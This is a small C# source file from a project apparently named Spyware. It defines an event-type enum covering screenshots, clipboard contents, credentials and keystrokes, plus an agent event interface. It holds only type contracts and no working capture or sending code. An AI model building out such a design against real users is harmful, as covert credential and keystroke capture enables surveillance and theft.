namespace Spyware.Core.Contracts;

public enum AgentEventType
{
    Screenshot = 1,
    Clipboard = 2,
    Credential = 3,
    Status = 4,
    Keyboard = 5,
    Note = 6
}

public interface IAgentEvent
{
    AgentEventType EventType { get; }
    DateTime TimestampUtc { get; }
}
